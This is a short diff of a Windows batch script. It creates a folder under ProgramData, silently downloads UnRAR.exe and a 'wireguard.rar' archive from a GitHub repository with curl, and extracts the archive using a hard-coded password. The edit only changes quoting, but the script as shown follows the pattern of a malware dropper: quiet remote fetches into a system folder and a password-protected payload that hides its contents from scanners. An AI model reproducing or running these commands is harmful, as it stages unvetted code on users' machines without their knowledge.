@@ -1,6 +1,6 @@
 mkdir %ProgramData%\Comms
-%WINDIR%\System32\curl.exe -s -L -o "%ProgramData%\Comms\UnRAR.exe" "https://github.com/vltex/0/raw/main/1/UnRAR.exe"
-%WINDIR%\System32\curl.exe -s -L -o "%ProgramData%\Comms\wireguard.rar" "https://github.com/vltex/0/raw/main/1/wireguard.rar"
+%WINDIR%\System32\curl.exe -s -L -o "%ProgramData%\Comms\UnRAR.exe" https://github.com/vltex/0/raw/main/1/UnRAR.exe
+%WINDIR%\System32\curl.exe -s -L -o "%ProgramData%\Comms\wireguard.rar" https://github.com/vltex/0/raw/main/1/wireguard.rar
 
 "%ProgramData%\Comms\UnRAR.exe" x -y -p741258963 "%ProgramData%\Comms\wireguard.rar" * "%ProgramData%\Comms\"
 
